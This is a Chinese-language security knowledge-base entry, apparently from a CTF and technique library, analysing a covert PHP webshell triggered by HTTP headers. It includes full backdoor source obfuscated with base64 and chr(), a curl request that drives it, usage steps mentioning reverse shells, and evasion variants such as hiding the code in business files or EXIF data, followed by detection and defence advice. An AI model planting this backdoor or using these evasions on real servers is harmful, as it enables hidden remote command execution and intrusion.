---
id: web-php-rce-header-gated-backdoor-call-user-func
title: PHP 请求头触发式隐蔽后门：base64 解码 header 名/值校验 + base64 命令头 + chr 拼接 system 交给 call_user_func
type: scenario
domain: web
path: web/php/rce
technique: php-header-gated-call-user-func-backdoor
aliases:
- PHP header 后门
- 请求头触发后门
- base64 header 校验后门
- chr 拼接 system
- call_user_func 隐蔽后门
- HTTP_ 变量后门
- 隐蔽 WebShell 后门
tags:
- php
- backdoor
- webshell
- request-header
- base64
- call-user-func
- obfuscation
- rce
- detection-evasion
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:12:10+08:00'
  notes: 已对照原文核对；base64 头名/值、chr 拼接 system、call_user_func 后门源码与截图一致；原文未发请求验证。
---

## 一句话结论

后门 PHP 文件用 `base64_decode` 还原出两个请求头名和对应的校验值，只有同时带上“密钥头”与“命令头”的请求才会进入执行分支：函数名 `system` 由 `chr(115).chr(121)...` 逐字符拼接，命令取自命令头的 Base64 解码值，最后用 `@call_user_func($func, $cmd)` 执行。源码里看不到明文的 `system`、`HTTP_X_...` 等特征，属于按请求头触发的隐蔽 PHP 后门。

## 原理

- **HTTP 头到 `$_SERVER` 的映射**：PHP 会把请求头 `X-Cat-Secret: value` 映射为 `$_SERVER['HTTP_X_CAT_SECRET']`（大写、`-` 换 `_`、前缀 `HTTP_`）。后门先 `base64_decode` 得到头名与校验值，再用 `$_SERVER['HTTP_' . $headerKey]` 取值比较，因此源码中不出现明文字符串。
- **双头门控**：一个头承担“认证”（值必须等于后门内置的 Base64 解码结果），另一个头承担“命令传输”（其值再做 Base64 解码得到 shell 命令）。缺少任一请求头就不执行，普通访问/扫描器看到的是空白或正常页面，降低被发现概率。
- **函数名隐藏**：`chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)` 拼接出 `system`，静态关键字扫描 `system`/`exec`/`shell_exec` 时不会命中。
- **动态调用**：`call_user_func($func, $cmd)` 以变量函数名调用；`@` 抑制错误输出，避免命令失败时在响应中留下报错特征。等价的 `$func($cmd)` 也能达到同样效果，使用 `call_user_func` 只是多一层间接。
- **为什么可行**：PHP 不限制 `call_user_func` 调用内置函数（除非 `disable_functions` 禁用），`system` 会把命令交给 `/bin/sh -c` 执行；命令头 Base64 解码后可包含空格、引号、管道等任意字符，不受 URL 参数过滤影响。
- **隐蔽性边界**：文件本身仍是 PHP 代码，`base64_decode` + `$_SERVER['HTTP_'` + `call_user_func` 的组合在源码审计/主机扫描中仍是强特征；如果攻击者进一步拆分字符串或使用 `assert`/`eval`，特征会变化，但动态调用与请求头取值的语义不变。

## 触发条件

- 后门 PHP 文件已落盘在 Web 可访问目录，且 Web 服务器解析 PHP。
- 攻击者知道（或从源码泄露/CTF 题面获得）两个 Base64 头名与校验值；不知道时需暴力猜头名/值，通常不现实。
- `disable_functions` 未禁用 `system`/`call_user_func`，`open_basedir` 不限制命令执行（命令执行本身不受 open_basedir 影响，但读取文件会）。
- 请求可自定义 HTTP 头（curl/Burp/任意 HTTP 客户端均可）。

## 利用步骤

1. **读取后门源码**：找到类似 `$headerKey = base64_decode('...'); $headerVal = base64_decode('...'); $cmdHeader = base64_decode('...');` 的常量。
2. **还原头名/校验值**：对三个 Base64 串解码，得到“密钥头名”“密钥值”“命令头名”。解码结果通常是 `$_SERVER` 中的后缀形式（大写、下划线，如 `X_BACKDOOR_KEY`）；实际发送的 HTTP 头把下划线换回短横线（`X-Backdoor-Key`），PHP 会自动映射为 `HTTP_X_BACKDOOR_KEY`。
3. **构造命令**：把要执行的命令 Base64 编码，例如 `id` → `aWQ=`，`cat /flag` → `Y2F0IC9mbGFn`。
4. **发送请求**：同时带上密钥头（原值）和命令头（Base64 命令），访问后门文件；响应中应出现命令输出。
5. **验证**：先用 `id`/`whoami` 确认执行权限，再读 flag/配置；若无回显，可换成写文件/反弹 shell 命令。

## PoC

后门代码结构（按原文代码语义还原，头名/值为示例）：

```php
<?php
$headerKey = base64_decode('WF9CQUNLRE9PUl9LRVk=');   // X_BACKDOOR_KEY
$headerVal = base64_decode('c2VjcmV0LTEyMw==');       // secret-123
$cmdHeader = base64_decode('WF9CQUNLRE9PUl9DTUQ=');   // X_BACKDOOR_CMD

if (isset($_SERVER['HTTP_' . $headerKey])
    && $_SERVER['HTTP_' . $headerKey] === $headerVal) {
    $func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // system
    $cmd = isset($_SERVER['HTTP_' . $cmdHeader])
        ? base64_decode($_SERVER['HTTP_' . $cmdHeader]) : '';
    @call_user_func($func, $cmd);
}
```

请求示例：

```bash
curl -s http://target/backdoor.php \
  -H 'X-BACKDOOR-KEY: secret-123' \
  -H "X-BACKDOOR-CMD: $(printf 'id' | base64)"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

原文仅展示后门源码，未给出实际请求/回显；上述请求是按代码语义构造的最小验证方式，未在真实目标执行。

## 变体与关联

- **函数名变体**：`chr()` 拼接可换成十六进制字符串 + `hex2bin`、字符串反转、`str_rot13`、`implode` 数组等；也可用 `assert`、`eval`、`passthru`、`shell_exec`、`popen`。
- **头名变体**：密钥头/命令头可任意命名，Base64 常量可拆成多段拼接；校验值可改为哈希比较（如 `md5($value) === '...'`）或时间/HMAC。
- **触发方式变体**：除 `$_SERVER['HTTP_*']` 外，还可用 `getallheaders()`、`apache_request_headers()`、Cookie、User-Agent 或自定义 GET/POST 参数；核心是“隐藏的认证 + 动态函数调用”。
- **检测对抗**：可去掉 `@`、改用 `call_user_func_array`、把后门藏在正常业务文件尾部或图片 EXIF 中；源码审计需关注 `base64_decode` 与 `$_SERVER['HTTP_` 的组合。
- 关联：[[web-php-rce-eval-getallheaders-no-param-function-call]]（getallheaders 把请求头变成函数参数）、[[web-php-rce-webshell-business-data-carrier-obfuscation]]（WebShell 业务数据伪装）、[[web-php-rce-isr-randomized-function-name-recovery]]（动态函数名还原）、[[defense-detection-linux-memfd-fileless-process]]（无文件/隐蔽执行检测思路）。

## 检测与防御

- **源码/文件扫描**：grep/YARA 匹配 `base64_decode` 与 `$_SERVER['HTTP_` 同文件出现、`call_user_func`/`call_user_func_array` 的参数来自请求头、连续 `chr(` 拼接、`@call_user_func` 等组合；对 Web 目录做定期完整性校验，发现未知 PHP 文件立即隔离。
- **请求检测**：监控带异常自定义头的请求（尤其头名不是常见业务头、值与 Base64 特征匹配），以及同一 URI 在短时间内用不同头值访问的日志；WAF 可对 `X-*` 头中的 Base64 长串告警。
- **运行时防护**：`disable_functions` 禁用 `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`/`call_user_func`（按业务需要），启用 `open_basedir`；使用 PHP-FPM 池隔离与只读代码目录。
- **主机检测**：Web 进程出现 `sh -c` 子进程、异常外连、读取 `/etc/passwd`/flag 等行为；结合文件监控（inotify/EDR）发现 Web 目录新增 PHP 文件。
